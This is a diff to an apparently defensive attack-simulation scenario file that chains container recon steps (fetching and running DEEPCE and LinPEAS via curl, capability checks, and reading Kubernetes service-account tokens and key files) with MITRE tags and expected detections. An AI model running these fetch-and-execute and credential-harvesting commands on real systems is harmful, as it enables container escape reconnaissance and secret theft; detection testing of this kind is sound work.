@@ -68,6 +68,20 @@ external_tools:
     type: script
     install_inline: true
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# The pod's container runtime (containerd-shim → runc → container entrypoint
+# shell) is the Causality Group Owner — the process that OWNS this in-container
+# recon chain, NOT the cortexsim-agent beacon. Every recon step is a child of
+# the same container entrypoint shell (shared container_id + causality actor),
+# so the spine is a process_lineage chain: install deps → curl|bash DEEPCE →
+# capability/device recon → service-account-token harvest → LinPEAS. The recon
+# runs from the non-root container-runtime identity while the CGO stays root
+# (the Linux privilege-drop-across-exec the sensor traces). platforms tag the
+# Linux container env; step-04's k8s service-account-token read adds k8s.
+cgo_anchor:
+  image_name: "containerd-shim"
+  primary_username: "root"
+
 steps:
   - id: step-01
     name: "Install enumeration dependencies"
@@ -78,6 +92,7 @@ steps:
       echo "[*] Dependency install complete"
     identity: container-runtime
     mitre_technique: "T1059.004"
+    platforms: ["linux", "container"]
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -90,6 +105,10 @@ steps:
     command: "curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt"
     identity: container-runtime
     mitre_technique: "T1613"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -107,6 +126,10 @@ steps:
     command: "ls -la /dev/ | head -30 && echo '---' && cat /proc/1/status | grep -E 'CapEff|CapPrm' && echo '---' && mount | grep -E 'overlay|docker|k8s' && echo '---' && env | grep -iE 'kube|docker|container'"
     identity: container-runtime
     mitre_technique: "T1613"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -124,6 +147,10 @@ steps:
     command: "find / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20 && ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50 && echo '[truncated for safety]'"
     identity: container-runtime
     mitre_technique: "T1552.001"
+    platforms: ["linux", "container", "k8s"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -141,6 +168,10 @@ steps:
     command: "curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape' | tee /tmp/linpeas_cdr_output.txt"
     identity: container-runtime
     mitre_technique: "T1082"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
